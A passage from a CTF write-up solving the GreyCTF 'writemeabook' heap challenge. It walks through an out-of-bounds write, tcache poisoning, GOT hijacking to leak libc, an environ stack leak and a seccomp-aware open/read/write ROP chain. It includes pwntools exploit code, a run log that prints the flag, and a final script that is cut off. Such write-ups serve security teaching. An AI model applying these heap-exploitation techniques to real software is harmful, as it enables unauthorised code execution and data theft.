&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invaid slot!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>As you can read there is an out of bound write if we input <code>books[idx].size</code> bytes, indeed given the chunk stores only <code>books[idx].size</code> bytes the signature writes over the current chunk. And most of the time on the header (and especially the size) of the next chunk allocated in memory resulting an overlapping chunk.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Given we can get overlapping chunks we’re able to do tcache poisoning on the <code>0x40</code> tcachebin (to deeply understand why I advice you to read the exploit and to run it into gdb). At this point we can simply write the first entry of <code>@books</code> that is stored at a fixed memory area within the binary (no PIE). In this new entry we could write a pointer to itself but with a large size in order to be able to write several entries of <code>@books</code>. When it is done we could write these entries:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">1</span>, pwn.flat([</span><br><span class="line">        <span class="comment"># 1==</span></span><br><span class="line">        <span class="number">0xff</span>, <span class="comment"># sz</span></span><br><span class="line">        exe.sym.stdout, <span class="comment"># to leak libc</span></span><br><span class="line">        <span class="comment"># 2==</span></span><br><span class="line">        <span class="number">0x8</span>, <span class="comment"># sz</span></span><br><span class="line">        exe.got.free, <span class="comment"># to do GOT hiijacking</span></span><br><span class="line">        <span class="comment"># 3==</span></span><br><span class="line">        <span class="number">0x8</span>, <span class="comment"># sz</span></span><br><span class="line">        exe.sym.secret_msg, <span class="comment"># to be able to print an entry of @books</span></span><br><span class="line">        <span class="comment"># 4==</span></span><br><span class="line">        <span class="number">0xff</span>, <span class="comment"># sz</span></span><br><span class="line">        exe.sym.books <span class="comment"># ptr to itself to be able to rewrite the entries when we need to do so</span></span><br><span class="line">    ] + [<span class="number">0</span>] * <span class="number">0x60</span>, filler = <span class="string">b&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>This way we can easily leak libc.</p>
<h2 id="Leaking-libc"><a href="#Leaking-libc" class="headerlink" title="Leaking libc"></a>Leaking libc</h2><p>Leaking libc is very easy given we already setup the entries of <code>@books</code>. We can replace <code>free@GOT</code> by <code>puts@plt</code>. This way the next time free will be called on an entry, it will leak the datas towards which the entry points. Which means <code>free(book[1])</code> leaks the address of stdout within the libc.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">STDOUT = <span class="number">0x21a780</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [...]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">libc_leak_free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Option: &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    <span class="keyword">return</span> pwn.unpack(io.recvline().replace(<span class="string">b&quot;\n&quot;</span>, <span class="string">b&quot;&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - STDOUT</span><br><span class="line"></span><br><span class="line"><span class="comment"># [...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc leak</span></span><br><span class="line">libc.address = libc_leak_free(<span class="number">1</span>)</span><br><span class="line">pwn.log.success(<span class="string">f&quot;libc: <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Leaking-the-stack"><a href="#Leaking-the-stack" class="headerlink" title="Leaking the stack"></a>Leaking the stack</h2><p>Leaking the libc is cool but given the binary has a seccomp we cannot write one_gadgets on <code>__malloc_hook</code> or <code>__free_hook</code> or within the GOT (of the libc or of the binary) because of the seccomp. We have to do a ROPchain, to do so we could use <code>setcontext</code> but for this libc it is made around <code>rdx</code> that we do not control. Or we could simply leak <code>environ</code> to get the address of a stackframe from which we could return. That’s what we gonna do on the <code>rewrite_books</code> stackframe.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak_environ</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Option: &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    <span class="keyword">return</span> pwn.unpack(io.recvline().replace(<span class="string">b&quot;\n&quot;</span>, <span class="string">b&quot;&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack (environ)</span></span><br><span class="line">edit(<span class="number">4</span>, pwn.flat([</span><br><span class="line">        <span class="comment"># 1==</span></span><br><span class="line">        <span class="number">0xff</span>, <span class="comment"># sz</span></span><br><span class="line">        libc.sym.environ <span class="comment"># target</span></span><br><span class="line">    ], filler = <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">environ = leak_environ(<span class="number">1</span>)</span><br><span class="line">pwn.log.success(<span class="string">f&quot;environ: <span class="subst">&#123;<span class="built_in">hex</span>(environ)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">stackframe_rewrite = environ - <span class="number">0x150</span></span><br><span class="line">pwn.log.success(<span class="string">f&quot;stackframe_rewrite: <span class="subst">&#123;<span class="built_in">hex</span>(stackframe_rewrite)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="ROPchain"><a href="#ROPchain" class="headerlink" title="ROPchain"></a>ROPchain</h2><p>Everything is ready for the ROPchain, we cannot use mprotect to use a shellcode within the seccomp forbids it. We just have to set the first entry to the stackframe we’d like to hiijack and that’s it, then we just need call edit on this entry and the ROPchain is written and triggered at the return of the function!</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">rop = pwn.ROP(libc, base=stackframe_rewrite)</span><br><span class="line"></span><br><span class="line"><span class="comment"># setup the write to the rewrite stackframe</span></span><br><span class="line">edit(<span class="number">4</span>, pwn.flat([</span><br><span class="line">        <span class="comment"># 1==</span></span><br><span class="line">        <span class="number">0xff</span>, <span class="comment"># sz</span></span><br><span class="line">        stackframe_rewrite <span class="comment"># target</span></span><br><span class="line">    ], filler = <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPchain</span></span><br><span class="line">rop(rax=pwn.constants.SYS_open, rdi=stackframe_rewrite + <span class="number">0xde</span> + <span class="number">2</span>, rsi=pwn.constants.O_RDONLY) <span class="comment"># open</span></span><br><span class="line">rop.call(rop.find_gadget([<span class="string">&quot;syscall&quot;</span>, <span class="string">&quot;ret&quot;</span>]))</span><br><span class="line">rop(rax=pwn.constants.SYS_read, rdi=<span class="number">3</span>, rsi=heap_leak, rdx=<span class="number">0x100</span>) <span class="comment"># file descriptor bf ...</span></span><br><span class="line">rop.call(rop.find_gadget([<span class="string">&quot;syscall&quot;</span>, <span class="string">&quot;ret&quot;</span>]))</span><br><span class="line"></span><br><span class="line">rop(rax=pwn.constants.SYS_write, rdi=<span class="number">1</span>, rsi=heap_leak, rdx=<span class="number">0x100</span>) <span class="comment"># write</span></span><br><span class="line">rop.call(rop.find_gadget([<span class="string">&quot;syscall&quot;</span>, <span class="string">&quot;ret&quot;</span>]))</span><br><span class="line">rop.exit(<span class="number">0x1337</span>)</span><br><span class="line">rop.raw(<span class="string">b&quot;/flag\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rop.dump())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(rop.chain()) - <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># write and trigger the ROPchain</span></span><br><span class="line">edit(<span class="number">1</span>, rop.chain())</span><br></pre></td></tr></table></figure>

<h2 id="PROFIT"><a href="#PROFIT" class="headerlink" title="PROFIT"></a>PROFIT</h2><p>Finally:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">nasm@off:~/Documents/pwn/greycat/writemeabook/dist$ python3 exploit.py REMOTE HOST=34.124.157.94 PORT=12346</span><br><span class="line">[*] <span class="string">&#x27;/home/nasm/Documents/pwn/greycat/writemeabook/dist/chall&#x27;</span>                                                                                                 </span><br><span class="line">    Arch:     amd64-64-little  </span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found                                                                                                                 </span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fd000)                                                                                                                      </span><br><span class="line">    RUNPATH:  b<span class="string">&#x27;/home/nasm/Documents/pwn/greycat/writemeabook/dist&#x27;</span>                                       </span><br><span class="line">[*] <span class="string">&#x27;/home/nasm/Documents/pwn/greycat/writemeabook/dist/libc.so.6&#x27;</span>                            </span><br><span class="line">    Arch:     amd64-64-little                                                                                   </span><br><span class="line">    RELRO:    Partial RELRO                                                                                                                </span><br><span class="line">    Stack:    Canary found                                                                                                                   </span><br><span class="line">    NX:       NX enabled                                                                                                                        </span><br><span class="line">    PIE:      PIE enabled                                                                                                                         </span><br><span class="line">[*] <span class="string">&#x27;/home/nasm/Documents/pwn/greycat/writemeabook/dist/ld-linux-x86-64.so.2&#x27;</span> </span><br><span class="line">    Arch:     amd64-64-little                                                                        </span><br><span class="line">    RELRO:    Partial RELRO                                                                                                                </span><br><span class="line">    Stack:    No canary found                                                                                                                </span><br><span class="line">    NX:       NX enabled                                                                                                                     </span><br><span class="line">    PIE:      PIE enabled                                                                                                                         </span><br><span class="line">[+] Opening connection to 34.124.157.94 on port 12346: Done                                                                               </span><br><span class="line">[+] heap: 0x81a000                                                                                          </span><br><span class="line">[*] Encrypted fp: 0x40484d</span><br><span class="line">[+] libc: 0x7f162182f000                                                                                                                           </span><br><span class="line">[+] environ: 0x7ffe60582c98</span><br><span class="line">[+] stackframe_rewrite: 0x7ffe60582b48</span><br><span class="line">[*] Loaded 218 cached gadgets <span class="keyword">for</span> <span class="string">&#x27;/home/nasm/Documents/pwn/greycat/writemeabook/dist/libc.so.6&#x27;</span></span><br><span class="line">0x7ffe60582b48:   0x7f1621874eb0 pop rax; ret                     </span><br><span class="line">0x7ffe60582b50:              0x2 SYS_open</span><br><span class="line">0x7ffe60582b58:   0x7f162185ae51 pop rsi; ret</span><br><span class="line">0x7ffe60582b60:              0x0 O_RDONLY</span><br><span class="line">0x7ffe60582b68:   0x7f16218593e5 pop rdi; ret</span><br><span class="line">0x7ffe60582b70:   0x7ffe60582c28 (+0xb8)</span><br><span class="line">0x7ffe60582b78:   0x7f16218c0396 syscall; ret</span><br><span class="line">0x7ffe60582b80:   0x7f16218bf528 pop rax; pop rdx; pop rbx; ret</span><br><span class="line">0x7ffe60582b88:              0x0 SYS_read</span><br><span class="line">0x7ffe60582b90:            0x100</span><br><span class="line">0x7ffe60582b98:      b<span class="string">&#x27;uaaavaaa&#x27;</span> &lt;pad rbx&gt;</span><br><span class="line">0x7ffe60582ba0:   0x7f162185ae51 pop rsi; ret</span><br><span class="line">0x7ffe60582ba8:         0x81a000</span><br><span class="line">0x7ffe60582bb0:   0x7f16218593e5 pop rdi; ret</span><br><span class="line">0x7ffe60582bb8:              0x3</span><br><span class="line">0x7ffe60582bc0:   0x7f16218c0396 syscall; ret</span><br><span class="line">0x7ffe60582bc8:   0x7f16218bf528 pop rax; pop rdx; pop rbx; ret</span><br><span class="line">0x7ffe60582bd0:              0x1 SYS_write</span><br><span class="line">0x7ffe60582bd8:            0x100</span><br><span class="line">0x7ffe60582be0:      b<span class="string">&#x27;naaboaab&#x27;</span> &lt;pad rbx&gt;</span><br><span class="line">0x7ffe60582be8:   0x7f162185ae51 pop rsi; ret</span><br><span class="line">0x7ffe60582bf0:         0x81a000</span><br><span class="line">0x7ffe60582bf8:   0x7f16218593e5 pop rdi; ret</span><br><span class="line">0x7ffe60582c00:              0x1</span><br><span class="line">0x7ffe60582c08:   0x7f16218c0396 syscall; ret</span><br><span class="line">0x7ffe60582c10:   0x7f16218593e5 pop rdi; ret</span><br><span class="line">0x7ffe60582c18:           0x1337 [arg0] rdi = 4919</span><br><span class="line">0x7ffe60582c20:   0x7f16218745f0 <span class="built_in">exit</span></span><br><span class="line">0x7ffe60582c28:     b<span class="string">&#x27;/flag\x00&#x27;</span> b<span class="string">&#x27;/flag\x00&#x27;</span></span><br><span class="line">0xde</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Your book has been rewritten!</span><br><span class="line"></span><br><span class="line">grey&#123;gr00m1ng_4nd_sc4nn1ng_th3_b00ks!!&#125;</span><br><span class="line">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb9\x81\x00\x00\x00\xb8\x81\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb1\x81\x00\x00\x00\x00\x00\x00\x00\xc0\x81\x00\[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">$ </span><br><span class="line">[*] Closed connection to 34.124.157.94 port 12346</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>

<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>That was a nice medium heap challenge, even though that was pretty classic. You can find the tasks and the exploit <a target="_blank" rel="noopener" href="https://github.com/ret2school/ctf/tree/master/2023/greyctf/pwn/writemeabook">here</a>.</p>
<h2 id="Annexes"><a href="#Annexes" class="headerlink" title="Annexes"></a>Annexes</h2><p>Final exploit (with comments):</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># this exploit was generated via</span></span><br><span class="line"><span class="comment"># 1) pwntools</span></span><br><span class="line"><span class="comment"># 2) ctfmate</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&quot;chall&quot;</span></span><br><span class="line">LIBC = <span class="string">&quot;/home/nasm/Documents/pwn/greycat/writemeabook/dist/libc.so.6&quot;</span></span><br><span class="line">LD = <span class="string">&quot;/home/nasm/Documents/pwn/greycat/writemeabook/dist/ld-linux-x86-64.so.2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = pwn.context.binary = pwn.ELF(BINARY)</span><br><span class="line">libc = pwn.ELF(LIBC)</span><br><span class="line">ld = pwn.ELF(LD)</span><br><span class="line">pwn.context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">pwn.context.delete_corefiles = <span class="literal">True</span></span><br><span class="line">pwn.context.rename_corefiles = <span class="literal">False</span></span><br><span class="line">p64 = pwn.p64</span><br><span class="line">u64 = pwn.u64</span><br><span class="line">p32 = pwn.p32</span><br><span class="line">u32 = pwn.u32</span><br><span class="line">p16 = pwn.p16</span><br><span class="line">u16 = pwn.u16</span><br><span class="line">p8  = pwn.p8</span><br><span class="line">u8  = pwn.u8</span><br><span class="line"></span><br><span class="line">host = pwn.args.HOST <span class="keyword">or</span> <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="built_in">int</span>(pwn.args.PORT <span class="keyword">or</span> <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">local</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        <span class="keyword">return</span> pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> pwn.process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remote</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span></span><br><span class="line">    io = pwn.connect(host, port)</span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        pwn.gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.LOCAL:</span><br><span class="line">        <span class="keyword">return</span> local(argv, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">source /home/nasm/Downloads/pwndbg/gdbinit.py</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"></span><br><span class="line">HEAP_OFFT = <span class="number">0x3d10</span></span><br><span class="line">CHUNK3_OFFT = <span class="number">0x3d50</span></span><br><span class="line">STDOUT = <span class="number">0x21a780</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_ptr</span>(<span class="params">heap, offt, value</span>):</span><br><span class="line">    <span class="keyword">return</span> ((heap + offt) &gt;&gt; <span class="number">12</span>) ^ value</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">one_gadget</span>(<span class="params">filename</span>):</span><br><span class="line">  <span class="keyword">return</span> [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> subprocess.check_output([<span class="string">&#x27;one_gadget&#x27;</span>, <span class="string">&#x27;--raw&#x27;</span>, filename]).decode().split(<span class="string">&#x27; &#x27;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    io = start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">flip</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, flip)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, data: <span class="built_in">bytes</span></span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;Option: &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;Write me a book no more than 32 characters long!\n&quot;</span>, data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;Option: &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;Write me the new contents of your book that is no longer than what it was before.\n&quot;</span>, data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;Option: &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">heapLeak</span>(<span class="params">idx</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;Option: &quot;</span>, <span class="string">b&quot;1337&quot;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;What is your favourite number? &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;You found a secret message: &quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(io.recvline().replace(<span class="string">b&quot;\n&quot;</span>, <span 